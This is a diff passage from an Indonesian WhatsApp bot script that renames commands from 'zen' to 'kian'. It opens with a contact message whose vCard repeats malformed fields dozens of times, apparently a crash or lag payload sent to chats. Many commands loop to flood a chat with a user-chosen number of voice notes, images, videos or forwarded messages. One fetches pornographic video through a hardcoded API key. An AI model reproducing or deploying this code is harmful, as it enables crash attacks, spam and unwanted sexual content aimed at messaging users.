  const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© © 𝙕𝙚𝙣𝙪𝘼𝙞𝙯𝙖𝙠${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝙕𝙚𝙣𝙪𝘼𝙞𝙯𝙖𝙠\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
 haikal.sendContact(m.chat, global.ownerr, fkontaak)
@@ -1623,7 +1610,7 @@ case 'bully': case 'waifu': case 'cuddle': case 'neko': case 'cry': case 'kiss':
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
 haikal.sendMessage(m.chat, { image: anu, caption: `${buttonkal}` }, { quoted: m})
@@ -1631,12 +1618,12 @@ haikal.sendMessage(m.chat, { image: anu, caption: `${buttonkal}` }, { quoted: m}
 }
 break
 //=================================================//
-case 'zenbokep': case 'zenngentod': {
+case 'kianbokep': case 'kianngentod': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
 haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted: doc })
@@ -1644,7 +1631,7 @@ haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${co
 }
 break
 //=================================================//
-case 'zensange': {
+case 'kiansange': {
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) return m.reply(mess.group)
 if (!isBotAdmins) return m.reply(mess.botAdmin)
@@ -1779,12 +1766,12 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 }
 break
 //=================================================//
-case 'hu': case 'zen1': {
+case 'hu': case 'kian1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  mem = fs.readFileSync('./baseikal/sound/tes.mp3')
  haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1792,12 +1779,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'hi': case 'zen2': {
+case 'hi': case 'kian2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  mom = fs.readFileSync('./baseikal/sound/ketawa.mp3')
  haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1805,12 +1792,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'ha': case 'zen3': {
+case 'ha': case 'kian3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  mim = fs.readFileSync('./baseikal/sound/ketawa.mp3')
  haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1818,12 +1805,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'he': case 'zen4': {
+case 'he': case 'kian4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  mum = fs.readFileSync('./baseikal/sound/awkwk.mp3')
  haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1831,12 +1818,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'ba': case 'zen5': {
+case 'ba': case 'kian5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  ah = fs.readFileSync('./baseikal/sound/bang.mp3')
  haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1844,12 +1831,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'be': case 'zen6': {
+case 'be': case 'kian6': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  eh = fs.readFileSync('./baseikal/sound/nob.mp3')
  haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1857,12 +1844,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'bu': case 'zen7': {
+case 'bu': case 'kian7': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  ih = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1870,12 +1857,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'bi': case 'zen8': {
+case 'bi': case 'kian8': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  nyong = fs.readFileSync('./baseikal/sound/mastah.mp3')
  haikal.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1883,12 +1870,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'ca': case 'zen9': {
+case 'ca': case 'kian9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  ri = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1896,12 +1883,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'ci': case 'zen10': {
+case 'ci': case 'kian10': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  ru = fs.readFileSync('./baseikal/sound/loli.mp3')
  haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1909,12 +1896,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'cu': case 'zen11': {
+case 'cu': case 'kian11': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  re = fs.readFileSync('./baseikal/sound/kesel.mp3')
  haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1927,7 +1914,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
  ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
  haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -2021,7 +2008,7 @@ if (isBan) throw sticBanLu(from)
  haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
  }
  break
-case 'zen': {
+case 'kian': {
 if (isBan) throw sticBanLu(from)
  me = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
@@ -2516,7 +2503,7 @@ break
 //=================================================//
 case 'wangy':
 if (isBan) throw sticBanLu(from)
-if (!q) return reply (`Contoh : .wangy zenu`)
+if (!q) return reply (`Contoh : .wangy kian`)
 qq = q.toUpperCase()
 awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
  m.reply(awikwok)
@@ -3127,7 +3114,7 @@ if (isBan) throw sticBanLu(from)
 if (!m.quoted) return m.reply("Reply pesanya!")
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 quoted.copyNForward(m.chat, true)
 }
@@ -3608,167 +3595,167 @@ haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${
 }
 break
 /*
-case 'zensound1':
-case 'zensound2':
-case 'zensound3':
-case 'zensound4':
-case 'zensound5':
-case 'zensound6':
-case 'zensound7':
-case 'zensound8':
-case 'zensound9':
-case 'zensound10':
-case 'zensound11':
-case 'zensound12':
-case 'zensound13':
-case 'zensound14':
-case 'zensound15':
-case 'zensound16':
-case 'zensound17':
-case 'zensound18':
-case 'zensound19':
-case 'zensound20':
-case 'zensound21':
-case 'zensound22':
-case 'zensound23':
-case 'zensound24':
-case 'zensound25':
-case 'zensound26':
-case 'zensound27':
-case 'zensound28':
-case 'zensound29':
-case 'zensound30':
-case 'zensound31':
-case 'zensound32':
-case 'zensound33':
-case 'zensound34':
-case 'zensound35':
-case 'zensound36':
-case 'zensound37':
-case 'zensound38':
-case 'zensound39':
-case 'zensound40':
-case 'zensound41':
-case 'zensound42':
-case 'zensound43':
-case 'zensound44':
-case 'zensound45':
-case 'zensound46':
-case 'zensound47':
-case 'zensound48':
-case 'zensound49':
-case 'zensound50':
-case 'zensound51':
-case 'zensound52':
-case 'zensound53':
-case 'zensound54':
-case 'zensound55':
-case 'zensound56':
-case 'zensound57':
-case 'zensound58':
-case 'zensound59':
-case 'zensound60':
-case 'zensound61':
-case 'zensound62':
-case 'zensound63':
-case 'zensound64':
-case 'zensound65':
-case 'zensound66':
-case 'zensound67':
-case 'zensound68':
-case 'zensound69':
-case 'zensound70':
-case 'zensound71':
-case 'zensound72':
-case 'zensound73':
-case 'zensound74':
-case 'zensound75':
-case 'zensound76':
-case 'zensound77':
-case 'zensound78':
-case 'zensound79':
-case 'zensound80':
-case 'zensound81':
-case 'zensound82':
-case 'zensound83':
-case 'zensound84':
-case 'zensound85':
-case 'zensound86':
-case 'zensound87':
-case 'zensound88':
-case 'zensound89':
-case 'zensound90':
-case 'zensound91':
-case 'zensound92':
-case 'zensound93':
-case 'zensound94':
-case 'zensound95':
-case 'zensound96':
-case 'zensound97':
-case 'zensound98':
-case 'zensound99':
-case 'zensound100':
-case 'zensound101':
-case 'zensound102':
-case 'zensound103':
-case 'zensound104':
-case 'zensound105':
-case 'zensound106':
-case 'zensound107':
-case 'zensound108':
-case 'zensound109':
-case 'zensound110':
-case 'zensound111':
-case 'zensound112':
-case 'zensound113':
-case 'zensound114':
-case 'zensound115':
-case 'zensound116':
-case 'zensound117':
-case 'zensound118':
-case 'zensound119':
-case 'zensound120':
-case 'zensound121':
-case 'zensound122':
-case 'zensound123':
-case 'zensound124':
-case 'zensound125':
-case 'zensound126':
-case 'zensound127':
-case 'zensound128':
-case 'zensound129':
-case 'zensound130':
-case 'zensound131':
-case 'zensound132':
-case 'zensound133':
-case 'zensound134':
-case 'zensound135':
-case 'zensound136':
-case 'zensound137':
-case 'zensound138':
-case 'zensound139':
-case 'zensound140':
-case 'zensound141':
-case 'zensound142':
-case 'zensound143':
-case 'zensound144':
-case 'zensound145':
-case 'zensound146':
-case 'zensound147':
-case 'zensound148':
-case 'zensound149':
-case 'zensound150':
-case 'zensound151':
-case 'zensound152':
-case 'zensound153':
-case 'zensound154':
-case 'zensound155':
-case 'zensound156':
-case 'zensound157':
-case 'zensound158':
-case 'zensound159':
-case 'zensound160':
-case 'zensound161':
+case 'kiansound1':
+case 'kiansound2':
+case 'kiansound3':
+case 'kiansound4':
+case 'kiansound5':
+case 'kiansound6':
+case 'kiansound7':
+case 'kiansound8':
+case 'kiansound9':
+case 'kiansound10':
+case 'kiansound11':
+case 'kiansound12':
+case 'kiansound13':
+case 'kiansound14':
+case 'kiansound15':
+case 'kiansound16':
+case 'kiansound17':
+case 'kiansound18':
+case 'kiansound19':
+case 'kiansound20':
+case 'kiansound21':
+case 'kiansound22':
+case 'kiansound23':
+case 'kiansound24':
+case 'kiansound25':
+case 'kiansound26':
+case 'kiansound27':
+case 'kiansound28':
+case 'kiansound29':
+case 'kiansound30':
+case 'kiansound31':
+case 'kiansound32':
+case 'kiansound33':
+case 'kiansound34':
+case 'kiansound35':
+case 'kiansound36':
+case 'kiansound37':
+case 'kiansound38':
+case 'kiansound39':
+case 'kiansound40':
+case 'kiansound41':
+case 'kiansound42':
+case 'kiansound43':
+case 'kiansound44':
+case 'kiansound45':
+case 'kiansound46':
+case 'kiansound47':
+case 'kiansound48':
+case 'kiansound49':
+case 'kiansound50':
+case 'kiansound51':
+case 'kiansound52':
+case 'kiansound53':
+case 'kiansound54':
+case 'kiansound55':
+case 'kiansound56':
+case 'kiansound57':
+case 'kiansound58':
+case 'kiansound59':
+case 'kiansound60':
+case 'kiansound61':
+case 'kiansound62':
+case 'kiansound63':
+case 'kiansound64':
+case 'kiansound65':
+case 'kiansound66':
+case 'kiansound67':
+case 'kiansound68':
+case 'kiansound69':
+case 'kiansound70':
+case 'kiansound71':
+case 'kiansound72':
+case 'kiansound73':
+case 'kiansound74':
+case 'kiansound75':
+case 'kiansound76':
+case 'kiansound77':
+case 'kiansound78':
+case 'kiansound79':
+case 'kiansound80':
+case 'kiansound81':
+case 'kiansound82':
+case 'kiansound83':
+case 'kiansound84':
+case 'kiansound85':
+case 'kiansound86':
+case 'kiansound87':
+case 'kiansound88':
+case 'kiansound89':
+case 'kiansound90':
+case 'kiansound91':
+case 'kiansound92':
+case 'kiansound93':
+case 'kiansound94':
+case 'kiansound95':
+case 'kiansound96':
+case 'kiansound97':
+case 'kiansound98':
+case 'kiansound99':
+case 'kiansound100':
+case 'kiansound101':
+case 'kiansound102':
+case 'kiansound103':
+case 'kiansound104':
+case 'kiansound105':
+case 'kiansound106':
+case 'kiansound107':
+case 'kiansound108':
+case 'kiansound109':
+case 'kiansound110':
+case 'kiansound111':
+case 'kiansound112':
+case 'kiansound113':
+case 'kiansound114':
+case 'kiansound115':
+case 'kiansound116':
+case 'kiansound117':
+case 'kiansound118':
+case 'kiansound119':
+case 'kiansound120':
+case 'kiansound121':
+case 'kiansound122':
+case 'kiansound123':
+case 'kiansound124':
+case 'kiansound125':
+case 'kiansound126':
+case 'kiansound127':
+case 'kiansound128':
+case 'kiansound129':
+case 'kiansound130':
+case 'kiansound131':
+case 'kiansound132':
+case 'kiansound133':
+case 'kiansound134':
+case 'kiansound135':
+case 'kiansound136':
+case 'kiansound137':
+case 'kiansound138':
+case 'kiansound139':
+case 'kiansound140':
